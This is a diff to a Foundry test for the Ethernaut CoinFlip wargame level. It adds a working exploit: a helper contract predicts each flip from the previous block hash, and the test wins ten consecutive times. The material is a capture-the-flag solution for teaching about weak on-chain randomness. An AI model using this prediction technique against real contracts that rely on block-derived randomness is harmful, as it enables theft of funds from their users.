@@ -42,7 +42,23 @@ contract TestCoinFlip is BaseTest {
         vm.startPrank(player);
 
         // Solve the Challenge
-        
+        Guess guess = new Guess();
+        for (uint256 i = 0; i < 10; i++) {
+            bool side = guess.guess();
+            level.flip(side);
+            vm.roll(block.number.add(1));
+        }
         vm.stopPrank();
+    }
+}
+contract Guess {
+    uint256 public consecutiveWins;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    function guess() public view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        return side;
     }
 }
